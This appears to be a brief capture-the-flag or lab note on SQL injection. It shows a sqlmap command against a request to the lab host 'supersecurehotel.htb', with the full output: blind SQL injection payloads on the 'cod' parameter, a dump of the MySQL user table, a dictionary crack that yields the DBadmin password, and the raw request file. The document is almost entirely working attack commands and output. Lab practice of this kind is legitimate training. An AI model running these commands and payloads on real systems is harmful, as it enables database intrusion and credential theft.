# SQLi
# Sqlmap

```bash

 sqlmap -r log.req --dbms mysql --batch -D mysql -T user -C User,Password --dump --threads 10 
        ___                                                                                    
       __H__                                                                                   
 ___ ___[)]_____ ___ ___  {1.5.9#stable}
|_ -| . [(]     | .'| . |                                                                      
|___|_  [']_|_|_|__,|  _| 
      |_|V...       |_|   http://sqlmap.org
                                               
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws.
 Developers assume no liability and are not responsible for any misuse or damage caused by this program
                                                                                               
[*] starting @ 12:08:40 /2021-12-03/   
                                                                                                                                                                                              
[12:08:40] [INFO] parsing HTTP request from 'log.req'                                                                                                                                         
[12:08:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---                                                                                            
Parameter: cod (GET)                                                                           
    Type: boolean-based blind                                                                  
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: cod=(SELECT (CASE WHEN (7529=7529) THEN '1 ORDER BY 7' ELSE (SELECT 1102 UNION SELECT 9946) END))

    Type: time-based blind                                                                                                                                                                    
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                                                                 
    Payload: cod=1 ORDER BY 7 AND (SELECT 7244 FROM (SELECT(SLEEP(5)))eMJj)
---                               
[12:08:41] [INFO] testing MySQL
[12:08:41] [INFO] confirming MySQL                                                             
[12:08:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[12:08:41] [INFO] fetching entries of column(s) 'Password,`User`' for table 'user' in database 'mysql'
[12:08:41] [INFO] fetching number of column(s) 'Password,`User`' entries for table 'user' in database 'mysql'
[12:08:41] [INFO] retrieved: 1
[12:08:43] [INFO] retrieving the length of query output
[12:08:43] [INFO] retrieved: 41
[12:08:56] [INFO] retrieved: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0             
[12:08:56] [INFO] retrieving the length of query output
[12:08:56] [INFO] retrieved: 7
[12:09:00] [INFO] retrieved: DBadmin           
[12:09:00] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[12:09:00] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[12:09:00] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[12:09:00] [INFO] starting dictionary-based cracking (mysql_passwd)
[12:09:00] [INFO] starting 4 processes 
[12:09:04] [INFO] cracked password 'imissyou' for hash '*2d2b7a5e4e637b8fba1d17f40318f277d29964d0'                                                                                           
Database: mysql                                                                                                                                                                               
Table: user
[1 entry]
+---------+------------------------------------------------------+
| User    | Password                                             |
+---------+------------------------------------------------------+
| DBadmin | *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 (imissyou) |
+---------+------------------------------------------------------+

```

Content of log.req
```bash
$ cat log.req 
GET /room.php?cod=1%20ORDER%20BY%207 HTTP/1.1
Host: supersecurehotel.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=fhedr7nrfre5nmirgj8oqr11a5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```